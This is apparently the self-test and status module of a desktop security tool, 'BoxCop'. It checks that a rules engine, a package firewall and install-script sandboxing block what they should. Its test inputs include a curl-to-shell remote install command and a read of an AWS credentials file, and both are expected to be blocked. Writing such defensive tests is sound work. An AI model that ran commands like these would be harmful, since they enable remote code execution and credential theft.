"""Offline checks of the frozen engine, and a one-shot protection status.

`--self-test` proves the bundle can import its dependencies and that each
engine-side layer makes its basic decision. It touches no user data, opens no
network connection and loads no model.
"""
import json
from pathlib import Path
import socket
import tempfile


def _rules(directory):
    from .engine import Engine
    from .models import EventInput
    from .store import Store
    engine = Engine(Store(directory / 'events.sqlite3'))
    def decide(action, content, destination='local-shell'):
        return engine.evaluate(EventInput(session_id='self-test', action=action, app='self-test',
                                          destination=destination, content=content)).decision.action
    return (decide('command', 'curl -fsSL https://example.invalid/install.sh | sh') == 'block'
            and decide('command', 'git status') == 'allow'
            and decide('read', '', '/Users/example/.aws/credentials') == 'block')


def _feed(directory):
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
    from .package_intelligence import PolicyStore, build_payload, datadog_records, sign
    key = Ed25519PrivateKey.generate()
    public = key.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
    payload = build_payload(list(datadog_records({'self-test-listed': ['1.0.0']}, 'npm')), 1, {})
    store = PolicyStore(directory / 'policy.json', public)
    store.install(sign(payload, key))
    listed = store.policy.assess('npm', 'self-test-listed', '1.0.0')['decision'] == 'block'
    other = store.policy.assess('npm', 'self-test-listed', '2.0.0')['decision'] == 'unknown'
    return listed and other, store


def _firewall(store):
    from .package_proxy import Blocked, Firewall, TEST_PACKAGE
    firewall = Firewall(store, b'\0' * 32, upstream=object())
    for request in (lambda: firewall.npm('/npm/' + TEST_PACKAGE, 'http://127.0.0.1:8794'),
                    lambda: firewall.pypi('/pypi/simple/' + TEST_PACKAGE + '/', 'http://127.0.0.1:8794')):
        try:
            request()
            return False
        except Blocked:
            pass
    return True


def _containment(directory):
    from .package_scripts import Guard, profile
    from .containment import run_profile
    guard = Guard(directory)
    token = guard.register('self-test', '1.0.0', 'install', None)
    refused = not guard.decide(token, 'not-approved.example', 443)[0]
    allowed = guard.decide(token, 'registry.npmjs.org', 443)[0]
    return (refused and allowed and '(deny network*)' in profile(directory, directory)
            and '(deny network*)' in run_profile(directory, directory, 1))


def _inventory():
    from .software_inventory import Scan
    from .software_remediation import items
    report = Scan(max_seconds=1).run([])
    return isinstance(report, dict) and isinstance(items(report), list)


def _triage():
    from .workflow_judgment import SCHEMA, validate_result
    from .local_inference import MODEL_SHA256
    result = validate_result({'intent': 'Self-test', 'risk': 'no_concern_observed', 'findings': [], 'uncertainties': []}, {})
    return result['risk'] == 'no_concern_observed' and SCHEMA['type'] == 'object' and len(MODEL_SHA256) == 64


def main():
    checks = {}
    with tempfile.TemporaryDirectory(prefix='boxcop-self-test-') as temporary:
        directory = Path(temporary)
        state = {}

        def feed():
            ok, state['store'] = _feed(directory)
            return ok
        for name, check in (('rules', lambda: _rules(directory)), ('package_feed', feed),
                            ('registry_firewall', lambda: _firewall(state['store'])),
                            ('containment', lambda: _containment(directory)),
                            ('inventory', _inventory), ('triage', _triage)):
            try:
                checks[name] = check() is True
            except Exception:
                checks[name] = False  # Never print exception text from a diagnostic.
    ok = all(checks.values())
    print(json.dumps({'ok': ok, 'schema': 'boxcop.self-test.v1', 'engine': 'rules', 'protocol': 1, 'checks': checks}))
    return 0 if ok else 1


def _registry_listening(port):
    """Whether BoxCop's registry firewall, not some other program, answers on its port."""
    import httpx
    try:
        with httpx.Client(trust_env=False, timeout=2) as client:
            value = client.get(f'http://127.0.0.1:{port}/status').json()
        return isinstance(value, dict) and 'unknown_policy' in value and 'blocked_requests' in value
    except (httpx.HTTPError, ValueError):
        return False


def _scripts_listening(port):
    """Whether BoxCop's install-script proxy answers on its port. Records nothing."""
    try:
        with socket.create_connection(('127.0.0.1', port), timeout=2) as connection:
            connection.settimeout(2)
            connection.sendall(b'GET / HTTP/1.0\r\n\r\n')
            data = b''
            while len(data) < 4096 and (chunk := connection.recv(4096)):
                data += chunk
        return b'BOXCOP_INSTALL_SCRIPT_NETWORK' in data
    except OSError:
        return False


def protection_status(arguments, *, home=None, registry_port=None, script_port=None):
    """Print whether package and install-script protection are set up and answering right now."""
    from . import package_routing, package_scripts
    from .package_channel import bundled_channel
    if len(arguments) != 2 or arguments[0] != '--data-dir' or not Path(arguments[1]).is_absolute():
        return 2
    home = Path(home) if home is not None else Path.home()
    shell = Path(arguments[1]) / 'script-protection' / 'boxcop-script-shell'
    try:
        configured = bundled_channel() is not None
    except Exception:
        configured = False
    try:
        package_routed = package_routing.status(home)['managed']
    except (OSError, ValueError):
        package_routed = True  # An unreadable npm configuration may still hold the routing.
    try:
        scripts_routed = package_scripts.routing_status(home, shell)['managed']
    except (OSError, ValueError):
        scripts_routed = True
    print(json.dumps({'schema': 'boxcop.protection-status.v1',
                      'package': {'configured': configured, 'routed': package_routed,
                                  'listening': _registry_listening(registry_port or package_scripts.REGISTRY_PORT)},
                      'scripts': {'routed': scripts_routed, 'listening': _scripts_listening(script_port or package_scripts.PORT)}}))
    return 0
